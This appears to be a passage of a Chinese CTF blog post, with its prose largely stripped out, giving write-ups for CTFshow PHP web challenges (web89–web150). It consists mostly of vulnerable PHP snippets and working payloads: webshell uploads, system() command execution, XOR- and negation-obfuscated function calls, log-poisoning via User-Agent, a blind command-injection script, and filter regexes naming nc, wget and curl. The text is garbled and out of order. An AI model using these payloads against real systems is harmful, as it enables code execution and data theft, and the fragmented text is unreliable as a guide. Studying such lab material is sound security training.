::.\n>\n> ****\n\n\n\n### web138\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\nif(strripos($_POST['ctfshow'], \":\")>-1){\n    die(\"private function\");\n}\n\ncall_user_func($_POST['ctfshow']);\n```\n\n\n\ncall_user_func\n\n\n\n```\ncall_user_func(array($classname, 'say_hello'));\n classname say_hello\n```\n\n**payload**\n\n```\nctfshow[0]=ctfshow&ctfshow[1]=getFlag\n```\n\n\n\n### web139\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\n\n\n\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"\nresult=\"\"\nkey=0\nfor j in range(1,45):\n    print(j)\n    if key==1:\n        break\n    for n in str:\n        payload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n        #print(payload)\n        url=\"http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=\"+payload\n        try:\n            requests.get(url,timeout=(2.5,2.5))\n        except:\n            result=result+n\n            print(result)\n            break\n\n```\n\n\n\n### web140\n\n```\nhighlight_file(__FILE__);\nif(isset($_POST['f1']) && isset($_POST['f2'])){\n    $f1 = (String)$_POST['f1'];\n    $f2 = (String)$_POST['f2'];\n    if(preg_match('/^[a-z0-9]+$/', $f1)){\n        if(preg_match('/^[a-z0-9]+$/', $f2)){\n            $code = eval(\"return $f1($f2());\");\n            if(intval($code) == 'ctfshow'){\n                echo file_get_contents(\"flag.php\");\n            }\n        }\n    }\n}\n\n```\n\n```\nif(intval($code) == 'ctfshow')\n```\n\n,null\n\n```\n$code = eval(\"return $f1($f2());\"); \n```\n\n```\nintval('a')==0 intval('.')==0 intval('/')==0\n```\n\npayload\n\n```\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())     /var/www/html md5sha1\n```\n\nnull\n\n\n\n### web141\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/^\\W+$/', $v3)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n`/^\\W+$/` ,\n\n\n\n```\neval(\"return 1;phpinfo();\");\n```\n\n`phpinfo()` `1-phpinfo();`phpinfo()\n\n```\neval(\"return 1-phpinfo();\");//\n```\n\n**payload**\n\n```\nv1=1&v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&v2=1\n```\n\n\n\n### web142\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['v1'])){\n    $v1 = (String)$_GET['v1'];\n    if(is_numeric($v1)){\n        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);\n        sleep($d);\n        echo file_get_contents(\"flag.php\");\n    }\n} \n```\n\n`v1=0``$d=0`\n\n\n\n### web143\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n\n\n**payload**\n\n```\nv1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n```\n\n\n\n### web144\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && check($v3)){\n        if(preg_match('/^\\W+$/', $v2)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n\nfunction check($str){\n    return strlen($str)===1?true:false;\n}\n```\n\nv1,v2,v3\n\n**payload**\n\n```\n?v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)\n```\n\n\n\n### web155\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\nyu22xwp\n\n```\neval(\"return 1?phpinfo():1;\");\n```\n\nphpinfo()\n\n```\n?v1=1&v3=?(~%8F%97%8F%96%91%99%90)():&v2=1\n```\n\nphpinfo()\n\npayload\n\n```\n?v1=1&v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&v2=1\n```\n\n\n\n### web146\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n\n\n```\neval(\"return 1==phpinfo()||1;\");\n```\n\nphpinfo()\n\n**payload**\n\n```\n?v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&v2=1\n\n?v1=1&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%14%01%03%20%06%02'|'%60%60%60%20%60%28')|&v2=1\n\n?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1\n```\n\n\n\n### web147\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_POST['ctf'])){\n    $ctfshow = $_POST['ctf'];\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\n        $ctfshow('',$_GET['show']);\n    }\n\n}\n```\n\nwp\n\ncreate_function()\n\n```\ncreate_function('$a','echo $a.\"123\"')\n\n\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n\n```\n\n echo 1;}phpinfo();//\n \n\n```\nfunction f($a) {\n  echo 1;}phpinfo();//\n}\nphpinfo()\nfuzz%5c\n```\n\n**payload**\n\n```\nget: ?show=echo 123;}system('tac f*');//\npost: ctf=%5ccreate_function\n```\n\n\n\n### web148\n\n```\ninclude 'flag.php';\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n    if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&\\*\\+\\- ]+/\",$code)){\n        die(\"error\");\n    }\n    @eval($code);\n}\nelse{\n    highlight_file(__FILE__);\n}\n\nfunction get_ctfshow_fl0g(){\n    echo file_get_contents(\"flag.php\");\n}\n```\n\n\n\n**payload**\n\n```\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%02\"^\"%7d%60%60%21%60%28\");\n```\n\n\n\n### web149\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n\nfile_put_contents($_GET['ctf'], $_POST['show']);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n```\n\n\n\nindex.php\n\n\n\n\n\n\n\n### web150\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n}\n\n```\n\n\n\n```\nPOST /?isVIP=1 HTTP/1.1\nHost: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show\nUser-Agent: <?php eval($_POST[1]);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.1418869291.1680592508\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\n\nctf=/var/log/nginx/access.log&1=system('cat f*');\n```\n\n\n\n### web150_plus\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE && strrpos($ctf,\"log\")===FALSE){\n    include($ctf);\n}\n```\n\nlog\n\n> ```\n> __autoload()\n> __autoload  \n> ?..CTFSHOW..=phpinfophpinfo\n> ..CTFSHOW..__CTFSHOW__CTFSHOW\n> __autoload()phpinfophpinfo\n> getshell\n> ```\n\n**payload**\n\n```\n/?..CTFSHOW..=phpinfo\n```\n\nphp\n\n\n\n\n\n------\n\n...","source":"_posts/PHP.md","raw":"---\ntitle: PHP\ndate: 2022-03-21 21:23:21\nexcerpt: PHP\ncategories: \n---\n\n# PHP\n\nphp\n\n\n\n### web89\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n```\n\n`preg_match(\"/[0-9]/\", $num`\n\n`intval($num)``intval`\n\n\n\n**intval()**\n\n>  \n>  var  integer  0 array  0 array \n>  1 \n\n\n\n```\n<?php\n\necho intval(1234);  //1234\necho \"\\n\";\necho intval(042);  //34  08\necho \"\\n\";\necho intval(0x1a);  //26 0x16\necho \"\\n\";\necho intval(3e3);  //3000  3 X 10\necho \"\\n\";\necho intval('3e3');  //3000\necho \"\\n\";\necho intval(\"1234a\");  //1234\necho \"\\n\";\necho intval(4.2); //\n```\n\n\n\n\n\n```\n?num[]=a\n```\n\n\n\n### web90\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n} \n```\n\n\n\n`intval`\n\n```\nintval ( mixed $var [, int $base = 10 ] )\n```\n\n>  `base`  0 `var` \n>\n> -  \"0x\" ( \"0X\")  16  (hex)\n> -  \"0\"  8 (octal)\n> -  10  (decimal)\n\n```\nintval('4476a',0)=4476\nintval('010574',0)=4476\nintval('0x117c',0)=4476\n```\n\n\n\n\n\n### web91\n\n```\nshow_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n} \n```\n\n ``\n\n```\ni (ignore)\ng (global)\nm (more)\ns  . \nU ;; \n//:x ; \n//:A ;\n//:D $,; \n//:e preg_replace(), ;  \n```\n\n`(preg_match('/^php$/im', $a))`php\n\n`(preg_match('/^php$/i', $a))`php\n\n\n\n> preg_match()  preg_match_all() subject \n\n\n\n`%0a`enter\n\n**payload**\n\n```\n?cmd=%0aphp\n?cmd=php%0a1   (php%0a)\n```\n\n `%0aphp`payload `php%0a1`\n\n`^php$``(preg_match('/^php$/i', $a))`\n\n\n\n### web92\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n\n\n> intval()$base0$var ePHP\n\ne0b0x\n\n**payload**\n\n```\n?num=0b1000101111100\n?num=0x117c\n?num=4476e123\n```\n\n\n\n### web93\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    } \n```\n\ne\n\n0\n\n```\n?num=010574\n```\n\n\n\n### web94\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n0,if`===`\n\n `4476.0` \n\n```\n?num=4476.0\n```\n\n\n\n```\n?num=+010574\n?num= 010574//\n```\n\n\n\n### web95\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n  `+` \n\n```\n?num= 010574\n?num=+010574\n```\n\n\n\n### web96\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n\n\n} \n```\n\nflag.php\n\n```\n?u=./flag.php\n```\n\n\n\n```\n?u=php://filter/resource=flag.php\n```\n\n\n\n### web97\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif (isset($_POST['a']) and isset($_POST['b'])) {\nif ($_POST['a'] != $_POST['b'])\nif (md5($_POST['a']) === md5($_POST['b']))\necho $flag;\nelse\nprint 'Wrong.';\n}\n?> \n```\n\npostaba!=b\n\n`md5($_POST['a']) === md5($_POST['b'])`\n\n> MD5NULL\n\n```\na[]=1&b[]=2\n```\n\n\n\n### web98\n\n```\ninclude(\"flag.php\");\n$_GET?$_GET=&$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n?> \n```\n\n```\n`$_GET?$_GET=&$_POST:'flag';` \n```\n\n\n\nGETpostgetflag\n\n```\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n```\n\nflag='flag',COOKIEget,'flag'\n\n```\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; \n```\n\nflag='flag',SERVERget,'flag'\n\n```\n$_GET['HTTP_FLAG']=='flag'?$flag:__FILE__\n```\n\nHTTP_FLAG=flag'$flag\n\n\n\nget\n\n```\n?HTTP_FLAG=flag\n```\n\nGETpostget\n\ngetpost\n\n```\n?num=1111\n\npost:HTTP_FLAG=flag\n```\n\nhighlight_file($flag)$flagphp$flag\n\n\n\n### web99\n\n```\nhighlight_file(__FILE__);\n$allow = array();\nfor ($i=36; $i < 0x36d; $i++) { \n    array_push($allow, rand(1,$i));\n}\nif(isset($_GET['n']) && in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n\n?> \n```\n\n`array_push`\n\n> array_push  \n\n`in_array`\n\n> i\n\nncontentn\n\n1\n\n 1.php `1.php == 1`\n\ncontent\n\n```\n?n=1.php\n\nPOST:content=<?php @eval($_POST[1]);?>\n```\n\n\n\n\n\n### web100\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n`is_numeric`\n\n>  \n\n\n\n\n\n```\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\n```\n\n\n\n```\n&& --> || --> = --> and --> or\n```\n\nand\n\n```\n$v0=is_numeric($v1)\n```\n\nv1v2,v3\n\n\n\n```\neval(\"$v2('ctfshow')$v3\");\n```\n\n  `flag in class ctfshow; `\n\n`||`\n\n```\n?v1=1&v2=system(\"cat ctfshow.php\")||&v3=;\n```\n\n\n\n### web101\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n\n\n\n\n```\neval(\"$v2('ctfshow')$v3\"); \n```\n\nwp\n\n`ReflectionClasss`\n\n> ReflectionClass\n>\n> ReflectionClassPHP5Reflector\n> PHPnew ReflectionClass(system('cmd'))\n\n\n\n**payload**\n\n```\n?v1=1&v2=echo new ReflectionClass&v3=;\n```\n\n 0x2d -  35\n\n\n\n### web102\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n\n\n?>\n```\n\n`substr`\n\n> **substr** ( string `$string` , int `$start` [, int `$length` ] ) : string\n>\n>  `string`  `start`  `length` \n\n `$s = substr($v2,2);`v2[2:],\n\n`call_user_func`\n\n> **call_user_func** ( [callable](php/language.types.callable.html) `$callback` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](php/language.pseudo-types.html#language.types.mixed)\n>\n>  `callback` \n\nv1v3v2shell\n\nwp\n\n```\n<?=`tac *`;  \n```\n\nhex3c3f3d60746163202a603b \nbase64\n\n```\nPD89YHRhYyAqYDs= //hex\n```\n\n```\n5044383959485268597941715944733d\n```\n\n `3d`\n\nv1=hex2bin  v2=00504438395948526859794171594473  v3=php://1.php\n\n**payload**\n\n```\nPOST:v1=hex2bin\n\n?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n\n\n\n\n### web103\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n} \n```\n\n\n\n```\n<?=`cat *`;\n```\n\nbase64\n\n```\nPD89YGNhdCAqYDs\n```\n\nascii\n\n```\n5044383959474e6864434171594473\n```\n\ne\n\npayload\n\n```\n?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n\n\n### web104\n\n```\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n} \n```\n\nsha(a[])null  null==null\n\n\n\n### web105\n\n```\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='flag';\n$suces='';\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces); \n```\n\n\n\n```\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value; \n```\n\nGETKEYVALUE\n\n `$$key=$$value;` keyerror\n\n `suces=flag`\n\n `$suces=$flag`flagsucesseceserror\n\npost `error=suces`\n\n```\n$errot=$suces=$flag\n```\n\n\n\n```\nif(!($_POST['flag']==$flag)){\n    die($error); \n```\n\nerrorerrorflag\n\n**payload**\n\n```\n?suces=flag\n\nPOST:error=suces\n```\n\n\n\n### web106\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) && $v1!=$v2){\n        echo $flag;\n    }\n} \n```\n\n\n\n\n\n### web107\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n\n} \n```\n\n`parse_str`\n\n> **parse_str** ( string `$encoded_string` [, array `&$result` ] ) : void\n>\n>  `encoded_string`  URL query string `result`  \n\nv3=flag\n\n`v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc`flagmd5\n\n**payload**\n\n```\n?v3=flag\nPOST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc\n```\n\n md5nullv2flagnullnull==null\n\n```\n?v3[]=\nPOST:V1=\n```\n\n\n\n### web108\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n\n}\n//36dflag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n```\n\n\n\nereg%00\n\npayload\n\n```\n?c=a%00778\n```\n\n\n\n### web109\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n\n} \n```\n\nv1v2evalweb101\n$v1v1$v2()\n\n__toString()phpReflectionclassExceptionError\n`__toString()`\n\n> PHP5.2.0__toString()  echo  print PHP5.2.0\n\necho`$v1``__toString()`v2\n\n**payload**\n\n```\n?v1=CachingIterator&v2=system(ls)\n?v1=Exception&v2=system('cat fl36dg.txt') \n```\n\n\n\n### web110\n\n```\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n\n    eval(\"echo new $v1($v2());\");\n\n} \n```\n\nFilesystemIteratorFilesystemIteratorgetcwd()\n\n**payload**\n\n```\n?v1=FilesystemIterator&v2=getcwd\n```\n\nfl36dga.txt\n\nurl/fl36dga.txtflag\n\n`FilesystemIterator`\n\n\n\n\n\n> FilesystemIteratorgetcwd()\n\n```\n<?php\n\terror_reporting(0);\n\techo getcwd().PHP_EOL;\n\techo new FilesystemIterator('./').PHP_EOL;\n\techo new FilesystemIterator(getcwd());\n?>\n\nD:\\PHP\n  index.php\n  index.php\n```\n\n\n\n### web111\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nfunction getFlag(&$v1,&$v2){\n    eval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n}\n\n\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){\n            die(\"error v2\");\n    }\n    \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n     \n```\n\nv1ctfshowgetFlag\n\n```\neval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n```\n\n$ctfshow=$$v2,$$v1\n\n`v2=GLOBALS`\n\n```\nvar_dump($GLOBALS);\n```\n\npayload\n\n```\n?v1=ctfshow&v2=GLOBALS\n```\n\n\n\n### web112\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`is_file`\n\n> 